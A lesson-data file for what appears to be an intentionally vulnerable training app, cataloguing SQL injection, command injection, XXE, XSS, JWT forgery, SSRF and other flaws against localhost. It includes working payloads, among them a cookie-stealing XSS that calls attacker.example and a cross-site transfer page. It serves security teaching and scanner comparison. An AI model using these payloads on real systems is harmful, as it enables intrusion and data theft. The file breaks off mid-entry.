// Lesson data — each entry documents one vulnerability with a short
// description, the exact manual exploitation steps, the expected
// result, and which scanner family tends to catch it. Used by
// components/Lessons.jsx.

export const CATEGORIES = [
  'Injection',
  'XSS',
  'Auth & Access Control',
  'Business Logic',
  'File Operations',
  'Cross-Origin & Redirects',
  'Cryptography',
  'Info Disclosure',
  'Client-side',
  'Dependencies (SCA)',
  'Secrets',
];

export const SEVERITIES = ['Critical', 'High', 'Medium', 'Low'];

// `detectedBy` keys: SAST, DAST, IAST, SCA, Secrets, AI
// Values: 'yes' | 'partial' | 'no'

export const LESSONS = [
  // ============================================================
  // INJECTION
  // ============================================================
  {
    id: 'sqli-login',
    title: 'SQL Injection — Authentication bypass',
    cwe: 'CWE-89',
    severity: 'Critical',
    category: 'Injection',
    where: 'POST /api/login → backend/handlers_auth.go (Login)',
    description:
      'The username and MD5(password) are concatenated directly into a SELECT statement. An attacker can comment out the password check and authenticate as any user.',
    steps: [
      'Open a terminal.',
      "Run the curl below, or paste the username into the Login form on this app.",
    ],
    payload: `curl -s -X POST http://localhost:8080/api/login \\
  -H 'content-type: application/json' \\
  -d '{"username":"admin'"'"'-- ","password":"anything"}'`,
    formHint: "Login form → username: admin'--   password: anything",
    expected:
      'Server returns a valid JWT for "admin" without ever validating the password.',
    aiAdvantage:
      'A pattern scanner sees fmt.Sprintf with two %s — many SAST rules catch this. AI catches it from the surrounding query semantics.',
    detectedBy: { SAST: 'yes', DAST: 'yes', IAST: 'yes', SCA: 'no', Secrets: 'no', AI: 'yes' },
  },
  {
    id: 'sqli-comments-path',
    title: 'SQL Injection — Path parameter & ORDER BY',
    cwe: 'CWE-89',
    severity: 'High',
    category: 'Injection',
    where: 'GET /api/comments/:postId?order=… → handlers_comments.go (ListComments)',
    description:
      'Both the post id (URL path) and the `order` query string are concatenated into the SQL. Many DAST tools probe POST bodies more aggressively than path parameters, so this sink is a useful tooling stress-test.',
    payload: `curl -s 'http://localhost:8080/api/comments/1;SELECT%20pg_sleep(3)--'
curl -s 'http://localhost:8080/api/comments/1?order=id;%20DROP%20TABLE%20foo--'`,
    expected: 'Either a 3-second delay (time-based blind) or a Postgres error in the response with the raw query echoed.',
    detectedBy: { SAST: 'yes', DAST: 'partial', IAST: 'yes', AI: 'yes' },
  },
  {
    id: 'sqli-search',
    title: 'SQL Injection — LIKE filter on /api/search',
    cwe: 'CWE-89',
    severity: 'High',
    category: 'Injection',
    where: 'GET /api/search?q=… → handlers_misc.go (Search)',
    description:
      'The search term is concatenated into a LIKE pattern. The same endpoint also reflects the term in HTML (see "Reflected XSS").',
    payload: `curl -s "http://localhost:8080/api/search?q=%25%27%20UNION%20SELECT%20id%2C%20password_hash%20FROM%20users--"`,
    expected: 'List of users with their MD5 password hashes embedded in the rendered HTML page.',
    detectedBy: { SAST: 'yes', DAST: 'yes', IAST: 'yes', AI: 'yes' },
  },
  {
    id: 'sqli-reset',
    title: 'SQL Injection — Second-order via reset token',
    cwe: 'CWE-89',
    severity: 'High',
    category: 'Injection',
    where: 'POST /api/reset-password → handlers_auth.go (ResetPassword)',
    description:
      'The reset token is interpolated into a SELECT, opening a second SQLi sink that is reachable without authentication.',
    payload: `curl -s -X POST http://localhost:8080/api/reset-password \\
  -H 'content-type: application/json' \\
  -d $'{"token":"\\' UNION SELECT 1 -- ","new_password":"x"}'`,
    expected: 'Either the reset succeeds for user_id=1 (admin), or the verbose error reveals the raw query.',
    detectedBy: { SAST: 'yes', DAST: 'partial', IAST: 'yes', AI: 'yes' },
  },
  {
    id: 'cmd-injection',
    title: 'OS Command Injection — Ping helper',
    cwe: 'CWE-78',
    severity: 'Critical',
    category: 'Injection',
    where: 'POST /api/exec → handlers_misc.go (CommandExec)',
    description:
      'The `host` field is appended to "ping -c 1 …" and run via `sh -c`, allowing shell metacharacter abuse.',
    formHint: 'Tools page → "Ping (command injection)" → host: 127.0.0.1; id; cat /etc/passwd',
    payload: `curl -s -X POST http://localhost:8080/api/exec \\
  -H 'content-type: application/json' \\
  -d '{"host":"127.0.0.1; id; cat /etc/passwd"}'`,
    expected: 'Output includes the ping result, then `uid=0(root)` and the contents of /etc/passwd.',
    detectedBy: { SAST: 'yes', DAST: 'yes', IAST: 'yes', AI: 'yes' },
  },
  {
    id: 'xxe',
    title: 'XML External Entity (XXE)',
    cwe: 'CWE-611',
    severity: 'High',
    category: 'Injection',
    where: 'POST /api/parse-xml → handlers_misc.go (ParseXML)',
    description:
      'A hand-rolled SYSTEM-entity resolver reads any local file or makes any HTTP call before the XML is parsed. Combine with /api/fetch for double-confirmation.',
    formHint: 'Tools page → "XML parser (XXE)" — submit the default payload.',
    payload: `curl -s -X POST http://localhost:8080/api/parse-xml -H 'content-type: application/xml' --data '<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<foo>&xxe;</foo>'`,
    expected: 'JSON response with `resolved_entities.xxe` containing /etc/passwd.',
    detectedBy: { SAST: 'yes', DAST: 'partial', IAST: 'yes', AI: 'yes' },
  },
  {
    id: 'ssti',
    title: 'Server-Side Template Injection (SSTI)',
    cwe: 'CWE-1336',
    severity: 'Critical',
    category: 'Injection',
    where: 'GET /api/render?template=…  → handlers_misc.go (RenderTemplate)',
    description:
      'The renderer registers `env`, `envall` and `exec` template functions; if you can write or upload a template file, you get RCE.',
    payload: `# 1) Upload a malicious template (welcome.tpl path is also writable):
echo '{{exec "id"}}' > /tmp/pwn.tpl
curl -s -F file=@/tmp/pwn.tpl http://localhost:8080/api/upload
# 2) Render it through /api/render:
curl -s 'http://localhost:8080/api/render?template=../uploads/pwn.tpl'`,
    expected: 'The template renderer executes `id` and returns its output as the page body.',
    aiAdvantage:
      'Spotting a custom FuncMap that exposes `exec` requires reading the handler code; signature SAST may miss it unless it has a rule for that exact pattern.',
    detectedBy: { SAST: 'yes', DAST: 'partial', IAST: 'yes', AI: 'yes' },
  },
  {
    id: 'yaml-deserialization',
    title: 'Insecure YAML Deserialization',
    cwe: 'CWE-502',
    severity: 'High',
    category: 'Injection',
    where: 'POST /api/import → handlers_misc.go (ImportYAML) — uses gopkg.in/yaml.v2 v2.2.2',
    description:
      'Arbitrary YAML is parsed; certain top-level keys (e.g. `promote_to_admin`) are blindly mass-assigned to the database.',
    payload: `curl -s -X POST http://localhost:8080/api/import \\
  -H 'content-type: application/yaml' \\
  --data 'promote_to_admin: bob'`,
    expected: 'Bob is silently promoted to admin. The vulnerable yaml.v2 also enables billion-laughs DoS payloads.',
    detectedBy: { SCA: 'yes', SAST: 'partial', DAST: 'no', IAST: 'partial', AI: 'yes' },
  },

  // ============================================================
  // XSS
  // ============================================================
  {
    id: 'xss-reflected',
    title: 'Reflected XSS — /api/search',
    cwe: 'CWE-79',
    severity: 'High',
    category: 'XSS',
    where: 'GET /api/search?q=… → handlers_misc.go (Search)',
    description:
      'The search term is rendered through Go\'s `text/template` (which does NOT escape) inside a text/html response.',
    formHint: 'Search page → search box → <script>alert(1)</script>',
    payload: `# Browser:
http://localhost:8080/api/search?q=<script>alert(1)</script>`,
    expected: 'Browser executes the injected script in an alert.',
    aiAdvantage:
      'Choosing `text/template` instead of `html/template` for an HTML response is exactly the kind of context-sensitive bug AI reviewers catch faster than rule-based SAST.',
    detectedBy: { SAST: 'yes', DAST: 'yes', IAST: 'yes', AI: 'yes' },
  },
  {
    id: 'xss-stored',
    title: 'Stored XSS — Comments',
    cwe: 'CWE-79',
    severity: 'High',
    category: 'XSS',
    where: 'POST /api/comments → CreateComment; rendered by Comments.jsx via dangerouslySetInnerHTML',
    description:
      'Comment bodies are stored verbatim and rendered into the DOM with no sanitisation. Steals tokens from every visitor of the comments page.',
    formHint: 'Comments page → Body → <img src=x onerror=alert(document.cookie)>',
    payload: `curl -s -X POST http://localhost:8080/api/comments \\
  -H 'content-type: application/json' \\
  -d '{"post_id":1,"author":"mallory","body":"<img src=x onerror=fetch(\\\"//attacker.example?c=\\\"+document.cookie)>"}'`,
    expected: 'Every visitor of /comments triggers the payload; their JWT (stored in localStorage) is exfiltrated.',
    detectedBy: { SAST: 'yes', DAST: 'partial', IAST: 'yes', AI: 'yes' },
  },
  {
    id: 'xss-dom-hash',
    title: 'DOM XSS — Profile #hash',
    cwe: 'CWE-79',
    severity: 'High',
    category: 'XSS',
    where: 'Profile.jsx — decodeURIComponent(window.location.hash) → dangerouslySetInnerHTML',
    description:
      'Anything after `#` in the Profile URL is injected into the DOM unescaped.',
    payload: `# Visit while logged in:
http://localhost:3000/profile#<img src=x onerror=alert(1)>`,
    expected: 'Browser executes the payload after the page renders.',
    detectedBy: { SAST: 'yes', DAST: 'partial', IAST: 'yes', AI: 'yes' },
  },
  {
    id: 'xss-markdown',
    title: 'Markdown XSS — marked 0.3.6',
    cwe: 'CWE-79',
    severity: 'Medium',
    category: 'XSS',
    where: 'Search.jsx — marked(q) → dangerouslySetInnerHTML',
    description:
      'marked@0.3.6 has multiple known sanitisation bypasses. Combined with dangerouslySetInnerHTML, the markdown preview is a full XSS sink.',
    formHint: 'Search page → search box → [click me](javascript:alert(1))',
    payload: `# In the Search box, paste:
[click me](javascript:alert(1))
# or the raw HTML escape bypass:
<svg onload=alert(1)>`,
    expected: 'Either click triggers a JavaScript: navigation, or the SVG fires `onload` immediately.',
    detectedBy: { SCA: 'yes', SAST: 'partial', DAST: 'partial', AI: 'yes' },
  },
  {
    id: 'xss-handlebars',
    title: 'Template Injection — Handlebars 4.0.5',
    cwe: 'CWE-79',
    severity: 'High',
    category: 'XSS',
    where: 'Tools.jsx — Handlebars.compile(userInput)',
    description:
      'Handlebars 4.0.5 lets attackers reach Object.prototype, which on Node enables RCE. In the browser the impact is XSS via the rendered HTML being innerHTML-ed.',
    formHint: 'Tools page → "Handlebars" → template: {{this}} or arbitrary HTML.',
    payload: `# Browser → Tools page, set the template to:
<img src=x onerror=alert('hbs')>`,
    expected: 'The injected tag is rendered into the DOM and the script fires.',
    detectedBy: { SCA: 'yes', SAST: 'partial', DAST: 'partial', AI: 'yes' },
  },
  {
    id: 'eval-rce',
    title: 'eval() of user input — Calculator',
    cwe: 'CWE-95',
    severity: 'High',
    category: 'XSS',
    where: 'Tools.jsx — runEval()',
    description:
      'User input is passed directly to `eval()` in the browser — equivalent to client-side RCE / persistent XSS for the current session.',
    formHint: "Tools page → Calculator → fetch('/api/debug').then(r=>r.json()).then(j=>alert(JSON.stringify(j).slice(0,200)))",
    payload: `# Paste into the Calculator input:
fetch('/api/debug').then(r=>r.json()).then(j=>document.title=JSON.stringify(j))`,
    expected: 'The page title becomes the dump of /api/debug — env, AWS keys, JWT secret.',
    detectedBy: { SAST: 'yes', DAST: 'no', IAST: 'partial', AI: 'yes' },
  },

  // ============================================================
  // AUTH & ACCESS CONTROL
  // ============================================================
  {
    id: 'idor-users',
    title: 'IDOR — Read any user',
    cwe: 'CWE-639',
    severity: 'High',
    category: 'Auth & Access Control',
    where: 'GET /api/users/:id → handlers_users.go (GetUser)',
    description:
      'Authenticated users can fetch any other user record (including `api_key` and `role`) by simply changing the id.',
    payload: `# Login as bob first, then:
TOKEN=$(curl -s -X POST http://localhost:8080/api/login \\
  -H 'content-type: application/json' \\
  -d '{"username":"bob","password":"hunter2"}' | jq -r .token)
curl -s -H "Authorization: Bearer $TOKEN" http://localhost:8080/api/users/1`,
    expected: 'Returns admin\'s full record including api_key.',
    detectedBy: { SAST: 'partial', DAST: 'partial', IAST: 'partial', AI: 'yes' },
  },
  {
    id: 'idor-update',
    title: 'IDOR + Mass Assignment — Update any user',
    cwe: 'CWE-639 + CWE-915',
    severity: 'Critical',
    category: 'Auth & Access Control',
    where: 'PUT /api/users/:id → handlers_users.go (UpdateUser)',
    description:
      'Any authenticated user can write arbitrary columns on any other user. Promote yourself, drain balances, etc.',
    payload: `# After logging in as bob (token in $TOKEN):
curl -s -X PUT http://localhost:8080/api/users/3 \\
  -H "Authorization: Bearer $TOKEN" \\
  -H 'content-type: application/json' \\
  -d '{"role":"admin","balance":99999}'`,
    expected: 'bob is now an admin with 99999 balance.',
    detectedBy: { SAST: 'partial', DAST: 'no', IAST: 'partial', AI: 'yes' },
  },
  {
    id: 'mass-assign-register',
    title: 'Mass Assignment — Register as admin',
    cwe: 'CWE-915',
    severity: 'High',
    category: 'Auth & Access Control',
    where: 'POST /api/register → handlers_auth.go (Register)',
    description:
      'The register handler trusts whatever the client sends. Setting `"role":"admin"` self-promotes.',
    formHint: 'Register form → set role to "admin", then login.',
    payload: `curl -s -X POST http://localhost:8080/api/register \\
  -H 'content-type: application/json' \\
  -d '{"username":"mallory","password":"p","role":"admin","balance":1000000}'`,
    expected: 'Mallory exists with role=admin and balance=1,001,000.',
    detectedBy: { SAST: 'partial', DAST: 'no', IAST: 'partial', AI: 'yes' },
  },
  {
    id: 'jwt-alg-confusion',
    title: 'JWT alg=none / Signing-method confusion',
    cwe: 'CWE-345',
    severity: 'Critical',
    category: 'Auth & Access Control',
    where: 'main.go — AuthMiddleware → jwt.Parse without method pinning',
    description:
      'The middleware does not validate the JWT signing method before calling the key callback. Forged tokens with alg=none (or alg switched to RS256 with the HMAC key as "public") are accepted.',
    payload: `# Header  : {"alg":"none","typ":"JWT"}  → eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0
# Payload : {"user_id":1,"role":"admin","username":"admin","exp":9999999999}
# Note the trailing dot (empty signature):
TOK=eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VyX2lkIjoxLCJyb2xlIjoiYWRtaW4iLCJ1c2VybmFtZSI6ImFkbWluIiwiZXhwIjo5OTk5OTk5OTk5fQ.
curl -s -H "Authorization: Bearer $TOK" http://localhost:8080/api/admin/users`,
    expected: 'Admin user list returned without ever signing a token.',
    aiAdvantage:
      'AI catches "the parser callback returns the secret regardless of t.Method"; rule-based SAST often misses it unless it models jwt.Parse specifically.',
    detectedBy: { SAST: 'partial', DAST: 'no', IAST: 'partial', AI: 'yes' },
  },
  {
    id: 'jwt-weak-secret',
    title: 'Weak / hardcoded JWT secret',
    cwe: 'CWE-798 + CWE-321',
    severity: 'Critical',
    category: 'Auth & Access Control',
    where: 'backend/secrets.go — JWTSecret = "supersecretjwtkey_badbugny_2026!"',
    description:
      'Even without alg-confusion, the HS256 secret is in the repo. Anyone with the source can sign a valid admin token.',
    payload: `# Use jwt.io with HS256 and the secret above; or:
docker run --rm -it python:3-alpine pip install pyjwt -q && python -c '
import jwt; print(jwt.encode({"user_id":1,"role":"admin","username":"admin","exp":9999999999},
  "supersecretjwtkey_badbugny_2026!", algorithm="HS256"))'`,
    expected: 'A valid admin JWT signed with the leaked secret.',
    detectedBy: { Secrets: 'yes', SAST: 'partial', AI: 'yes' },
  },
  {
    id: 'token-in-url',
    title: 'Token accepted in URL query string',
    cwe: 'CWE-598',
    severity: 'Medium',
    category: 'Auth & Access Control',
    where: 'main.go — AuthMiddleware reads c.Query("token")',
    description:
      'JWTs in URLs leak via Referer headers, browser history, web-server logs, proxy logs, and shoulder-surfing.',
    payload: `curl -s 'http://localhost:8080/api/admin/users?token=YOUR_JWT_HERE'`,
    expected: 'Authentication succeeds via query string; the token now lives in nginx/ALB access logs.',
    detectedBy: { SAST: 'partial', DAST: 'partial', AI: 'yes' },
  },
  {
    id: 'admin-backdoor',
    title: 'Hardcoded admin backdoor',
    cwe: 'CWE-798 + CWE-285',
    severity: 'Critical',
    category: 'Auth & Access Control',
    where: 'main.go — AuthMiddleware accepts AdminBackdoorToken literally',
    description:
      'Sending the literal string `let_me_in_pls_2026` as the token grants admin. A classic "ship-with-debug-creds" backdoor.',
    payload: `curl -s 'http://localhost:8080/api/admin/users?token=let_me_in_pls_2026'`,
    expected: 'Full admin user list returned.',
    aiAdvantage:
      'A regex catches the string itself, but only AI explains "behavioural significance: any caller using this string becomes admin".',
    detectedBy: { Secrets: 'yes', SAST: 'partial', AI: 'yes' },
  },
  {
    id: 'jwt-localstorage',
    title: 'JWT stored in localStorage',
    cwe: 'CWE-922',
    severity: 'Medium',
    category: 'Auth & Access Control',
    where: 'frontend/src/api.js — localStorage.setItem("jwt", token)',
    description:
      'Any XSS instantly exfiltrates the JWT from localStorage. Pairs with the stored / reflected / DOM XSS lessons.',
    payload: `// Run in DevTools console on this site:
console.log(localStorage.getItem('jwt'));`,
    expected: 'Returns the current user\'s JWT.',
    detectedBy: { SAST: 'partial', AI: 'yes' },
  },
  {
    id: 'missing-authz-notes',
    title: 'Missing Authorization — Notes',
    cwe: 'CWE-862',
    severity: 'High',
    category: 'Auth & Access Control',
    where: 'GET /api/notes/:id → handlers_users.go (GetNote)',
    description:
      'Authenticated users can read any note, including admin\'s private one. Demonstrated on the Notes page.',
    formHint: 'Notes page → request id 1 while logged in as bob.',
    payload: `# After login as bob (token in $TOKEN):
curl -s -H "Authorization: Bearer $TOKEN" http://localhost:8080/api/notes/1`,
    expected: 'Returns admin\'s note containing a fake API key.',
    detectedBy: { SAST: 'partial', DAST: 'partial', IAST: 'partial', AI: 'yes' },
  },
  {
    id: 'admin-exec-sql',
    title: 'Arbitrary SQL via /api/admin/exec-sql',
    cwe: 'CWE-89',
    severity: 'Critical',
    category: 'Auth & Access Control',
    where: 'POST /api/admin/exec-sql → handlers_users.go (AdminExecSQL)',
    description:
      'An "admin" SQL console that runs whatever you send. Combined with any of the other admin-acquisition tricks above.',
    formHint: 'Admin page → Run SQL.',
    payload: `curl -s -X POST 'http://localhost:8080/api/admin/exec-sql?token=let_me_in_pls_2026' \\
  -H 'content-type: application/json' \\
  -d '{"sql":"SELECT username, password_hash, api_key FROM users"}'`,
    expected: 'Returns every user\'s MD5 password hash.',
    detectedBy: { SAST: 'yes', DAST: 'partial', AI: 'yes' },
  },

  // ============================================================
  // BUSINESS LOGIC
  // ============================================================
  {
    id: 'transfer-negative',
    title: 'Negative-amount transfer (money creation)',
    cwe: 'CWE-840',
    severity: 'Critical',
    category: 'Business Logic',
    where: 'POST /api/transfer → handlers_users.go (Transfer)',
    description:
      'The handler never checks `amount > 0`. A negative amount drains the recipient and credits the sender. No SAST/DAST tool has a generic rule for "amount must be positive" — but an LLM reading the handler spots it instantly.',
    payload: `# After login as bob:
curl -s -X POST http://localhost:8080/api/transfer \\
  -H "Authorization: Bearer $TOKEN" \\
  -H 'content-type: application/json' \\
  -d '{"to_user_id":1,"amount":-9999}'`,
    expected: 'Bob\'s balance grows by 9999 and admin\'s drops by the same amount.',
    aiAdvantage: 'Pure business-logic flaw; near-impossible to detect without semantic understanding.',
    detectedBy: { SAST: 'no', DAST: 'no', IAST: 'no', AI: 'yes' },
  },
  {
    id: 'transfer-race',
    title: 'TOCTOU race condition on transfer',
    cwe: 'CWE-362',
    severity: 'High',
    category: 'Business Logic',
    where: 'POST /api/transfer — read balance / write balance with no transaction',
    description:
      'Concurrent requests can both pass the balance check and double-spend. Demonstrate with `xargs -P` or `ab`.',
    payload: `# 30 parallel transfers of 100 from a 500-balance account:
seq 1 30 | xargs -P 30 -I{} curl -s -X POST http://localhost:8080/api/transfer \\
  -H "Authorization: Bearer $TOKEN" \\
  -H 'content-type: application/json' \\
  -d '{"to_user_id":1,"amount":100}'`,
    expected: 'Final balance goes negative or > expected, depending on race outcomes.',
    detectedBy: { SAST: 'partial', DAST: 'no', IAST: 'partial', AI: 'yes' },
  },
  {
    id: 'reset-token-leaked',
    title: 'Predictable + leaked password-reset token',
    cwe: 'CWE-330 + CWE-200',
    severity: 'High',
    category: 'Business Logic',
    where: 'POST /api/forgot-password → handlers_auth.go',
    description:
      'satori/go.uuid v1.2.0 has weak fallback RNG — but you don\'t even need to predict it: the response body returns the token directly.',
    payload: `curl -s -X POST http://localhost:8080/api/forgot-password \\
  -H 'content-type: application/json' \\
  -d '{"username":"admin"}'`,
    expected: 'Response includes `reset_token`, which you can immediately use to overwrite admin\'s password.',
    aiAdvantage:
      'Secret scanners look for hardcoded credentials, not for "this token was generated and is now in the response body".',
    detectedBy: { SAST: 'partial', DAST: 'partial', AI: 'yes' },
  },
  {
    id: 'user-enumeration',
    title: 'Username enumeration via differing errors',
    cwe: 'CWE-204',
    severity: 'Low',
    category: 'Business Logic',
    where: 'POST /api/forgot-password — different error for missing user',
    description:
      'The endpoint says "no such user: <name>" for unknown users and silently issues a token for known ones.',
    payload: `curl -s -X POST http://localhost:8080/api/forgot-password -H 'content-type: application/json' -d '{"username":"alice"}'
curl -s -X POST http://localhost:8080/api/forgot-password -H 'content-type: application/json' -d '{"username":"nope12345"}'`,
    expected: 'Different responses confirm whether a username exists.',
    detectedBy: { DAST: 'partial', AI: 'yes' },
  },

  // ============================================================
  // FILE OPS
  // ============================================================
  {
    id: 'path-traversal',
    title: 'Path Traversal — Download',
    cwe: 'CWE-22',
    severity: 'High',
    category: 'File Operations',
    where: 'GET /api/download?file=… → handlers_files.go (Download)',
    description:
      '`file` is joined with /app/uploads but never sanitised, so `../` segments escape the directory.',
    formHint: 'Files page → Download → ../../etc/passwd',
    payload: `curl -s 'http://localhost:8080/api/download?file=../../etc/passwd'`,
    expected: 'Returns the contents of /etc/passwd from the backend container.',
    detectedBy: { SAST: 'yes', DAST: 'yes', IAST: 'yes', AI: 'yes' },
  },
  {
    id: 'unrestricted-upload',
    title: 'Unrestricted File Upload',
    cwe: 'CWE-434',
    severity: 'High',
    category: 'File Operations',
    where: 'POST /api/upload → handlers_files.go (Upload)',
    description:
      'No MIME, no extension allowlist, filename is used verbatim — also allowing path traversal in the filename.',
    payload: `# Upload an HTML "shell" then load it:
echo '<script>alert("xss-from-upload")</script>' > /tmp/shell.html
curl -s -F file=@/tmp/shell.html http://localhost:8080/api/upload
curl -s 'http://localhost:8080/api/download?file=shell.html'`,
    expected: 'shell.html is stored and served back; combined with content-type tricks it becomes XSS or worse.',
    detectedBy: { SAST: 'partial', DAST: 'partial', AI: 'yes' },
  },

  // ============================================================
  // CROSS-ORIGIN & REDIRECTS
  // ============================================================
  {
    id: 'cors-misconfig',
    title: 'CORS misconfiguration with credentials',
    cwe: 'CWE-942',
    severity: 'High',
    category: 'Cross-Origin & Redirects',
    where: 'main.go — cors.Config{AllowOriginFunc: () => true, AllowCredentials: true}',
    description:
      'The backend reflects whatever Origin you send and sets Access-Control-Allow-Credentials: true. Any malicious site can call the API with the victim\'s session.',
    payload: `curl -s -i -H 'Origin: https://attacker.example' \\
  http://localhost:8080/api/profile -H "Authorization: Bearer $TOKEN" | grep -i access-control`,
    expected: 'Response carries `Access-Control-Allow-Origin: https://attacker.example` and `Access-Control-Allow-Credentials: true`.',
    detectedBy: { SAST: 'partial', DAST: 'yes', AI: 'yes' },
  },
  {
    id: 'no-csrf',
    title: 'No CSRF protection',
    cwe: 'CWE-352',
    severity: 'Medium',
    category: 'Cross-Origin & Redirects',
    where: 'every state-changing endpoint',
    description:
      'No anti-CSRF token, no SameSite cookies, JWT in header but with permissive CORS — drive-by transfer is trivial.',
    payload: `<!-- Host this on attacker.example and have the victim visit it: -->
<script>
fetch('http://localhost:8080/api/transfer', {
  method: 'POST', credentials: 'include',
  headers: { 'content-type': 'application/json' },
  body: JSON.stringify({ to_user_id: 99, amount: 1 }),
});
</script>`,
    expected: 'Transfer happens silently in the victim\'s session.',
    detectedBy: { SAST: 'partial', DAST: 'partial', AI: 'yes' },
  },
  {
    id: 'open-redirect-server',
    title: 'Open Redirect — Server side',
    cwe: 'CWE-601',
    severity: 'Medium',
    category: 'Cross-Origin & Redirects',
    where: 'GET /api/redirect?url=… → handlers_misc.go (OpenRedirect)',
    description:
      'Browsers and email gateways trust the target host; attackers chain this with phishing.',
    payload: `# Browser:
http://localhost:8080/api/redirect?url=https://attacker.example/phish`,
    expected: '302 redirect to attacker.example.',
    detectedBy: { SAST: 'yes', DAST: 'yes', AI: 'yes' },
  },
  {
    id: 'open-redirect-client',
    title: 'Open Redirect — Client side',
    cwe: 'CWE-601',
    severity: 'Medium',
    category: 'Cross-Origin & Redirects',
    where: 'App.jsx — useEffect reads ?next= and assigns to location.href',
    description:
      'A client-side redirect that the server never sees, so server-side WAFs miss it.',
    payload: `# Browser:
http://localhost:3000/?next=https://attacker.example`,
    expected: 'The SPA mounts, then redirects to attacker.example.',
    detectedBy: { SAST: 'partial', DAST: 'partial', AI: 'yes' },
  },
  {
    id: 'header-injection',
    title: 'HTTP Response Header Injection (CRLF)',
    cwe: 'CWE-113',
    severity: 'Medium',
    category: 'Cross-Origin & Redirects',
    where: 'GET /api/ping?msg=… → handlers_auth.go (Ping)',
    description:
      'The msg query string is reflected into an X-Echo header. Older Go versions / clients allow CRLF in custom headers, enabling cookie injection or response splitting.',
    payload: `curl -s -i 'http://localhost:8080/api/ping?msg=hello%0d%0aSet-Cookie:%20pwn=1'`,
    expected: 'Tools that don\'t strip CRLF observe an injected Set-Cookie header.',
    detectedBy: { SAST: 'partial', DAST: 'yes', AI: 'yes' },
  },
  {
    id: 'ssrf',
    title: 'SSRF — /api/fetch',
    cwe: 'CWE-918',
    severity: 'Critical',
    category: 'Cross-Origin & Redirects',
    where: 'GET /api/fetch?url=… → handlers_misc.go (SSRFFetch)',
    description:
      'Server-side proxy with no scheme allowlist, no IP-block list, returns the raw body. Pivots to internal services and cloud metadata.',
    formHint: 'Tools page → "URL fetch (SSRF)" — try the AWS metadata IP.',
    payload: `# AWS metadata pivot:
curl -s 'http://localhost:8080/api/fetch?url=http://169.254.169.254/latest/meta-data/'
# Internal Postgres TCP greeting:
curl -s 'http://localhost:8080/api/fetch?url=http://db:5432/'`,
    expected: 'Reaches internal endpoints unreachable from the host.',
    detectedBy: { SAST: 'yes', DAST: 'yes', IAST: 'yes', AI: 'yes' },
  },

  // ============================================================
  // CRYPTO
  // ============================================================
  {
    id: 'md5-passwords',
    title: 'MD5 password hashing (no salt)',
    cwe: 'CWE-916 + CWE-327',
    severity: 'High',
    category: 'Cryptography',
    where: 'crypto.go — md5hex(password) used everywhere',
    description:
      'Unsalted MD5 falls in seconds to rainbow tables. Hashes for the seeded users:',
    payload: `# Take a hash from the AdminExecSQL dump and crack it offline:
echo -n 'admin123' | md5sum     # → 0192023a7bbd73250516f069df18b500
echo -n 'password1' | md5sum
echo -n 'hunter2' | md5sum`,
    expected: 'Each seeded password hashes match instantly.',
    detectedBy: { SAST: 'yes', AI: 'yes' },
  },
  {
    id: 'custom-xor',
    title: 'Custom-built "encryption" (XOR)',
    cwe: 'CWE-327',
    severity: 'Medium',
    category: 'Cryptography',
    where: 'crypto.go — xorEncrypt()',
    description:
      'Hand-rolled XOR with a fixed key. Recovers the key in linear time given any known plaintext.',
    payload: `// Given plaintext P and ciphertext C: K[i] = P[i] XOR C[i]`,
    expected: 'Anyone who sees one plaintext/ciphertext pair recovers the entire key.',
    aiAdvantage:
      'Pattern-based scanners do not flag homemade ciphers; AI catches the smell from "we wrote our own crypto".',
    detectedBy: { SAST: 'partial', AI: 'yes' },
  },

  // ============================================================
  // INFO DISCLOSURE
  // ============================================================
  {
    id: 'debug-leak',
    title: 'Debug endpoint dumps secrets',
    cwe: 'CWE-200 + CWE-489',
    severity: 'Critical',
    category: 'Info Disclosure',
    where: 'GET /api/debug → handlers_misc.go (Debug)',
    description:
      'Returns env vars, JWT secret, AWS keys, GitHub PAT, Stripe key, DB credentials and the admin backdoor — all unauthenticated.',
    payload: `curl -s http://localhost:8080/api/debug | jq .`,
    expected: 'JSON containing every secret in the app.',
    detectedBy: { DAST: 'yes', IAST: 'yes', AI: 'yes' },
  },
  {
    id: 'verbose-errors',
    title: 'Verbose errors echo SQL',
    cwe: 'CWE-209',
    severity: 'Medium',
    category: 'Info Disclosure',
    where: 'most handlers — error JSON includes the raw query',
    description:
      'On any DB error the response includes the offending SQL string. This both leaks schema and helps an attacker craft injection payloads.',
    payload: `curl -s -X POST http://localhost:8080/api/login -H 'content-type: application/json' \\
  -d '{"username":"\\u0027","password":"x"}'`,
    expected: 'Response body shows the unescaped query that failed to parse.',
    detectedBy: { DAST: 'yes', AI: 'yes' },
  },

  // ============================================================
  // CLIENT-SIDE
  // ============================================================
  {
    id: 'proto-pollution-lodash',
    title: 'Prototype Pollution — lodash 4.17.4',
    cwe: 'CWE-1321',
    severity: 'High',
    category: 'Client-side',
    where: 'Search.jsx — _.merge of URL hash filters',
    description:
      'lodash 4.17.4 does not block `__proto__` keys, so any `Object.x` lookup in unrelated code is now controlled by the attacker.',
    payload: `# Browser:
http://localhost:3000/search#filters=%7B%22__proto__%22%3A%7B%22polluted%22%3A1%7D%7D
# Then in DevTools:
({}).polluted   // → 1`,
    expected: 'Object.prototype.polluted is set to 1 globally for the page.',
    detectedBy: { SCA: 'yes', SAST: 'partial', AI: 'yes' },
  },
  {
    id: 'proto-pollution-minimist',
    title: 'Prototype Pollution — minimist 1.2.0',
    cwe: 'CWE-1321',
    severity: 'High',
    category: 'Client-side',
    where: 'Tools.jsx — minimist(window.location.search.split("&"))',
    description:
      'Same bug class, different vulnerable lib. Reachable via URL params.',
    payload: `# Browser:
http://localhost:3000/tools?--__proto__.polluted=1
# DevTools:
({}).polluted   // → '1'`,
    expected: 'Object.prototype.polluted is set globally.',
    detectedBy: { SCA: 'yes', SAST: 'partial', AI: 'yes' },
  },

  // ============================================================
  // SCA
  // ============================================================
  {
    id: 'sca-backend',
    title: 'Vulnerable Go dependencies',
    cwe: 'A06:2021',
    severity: 'High',
    category: 'Dependencies (SCA)',
    where: 'backend/go.mod',
    description:
      'jwt-go v3.2.0 (deprecated, CVE-2020-26160), gin v1.7.7 (CVE-2023-26125, CVE-2023-29401), yaml.v2 v2.2.2 (CVE-2019-11254), satori/go.uuid v1.2.0 (CVE-2021-3538).',
    payload: `docker run --rm -v "$PWD":/repo aquasec/trivy:latest fs --scanners vuln /repo/backend
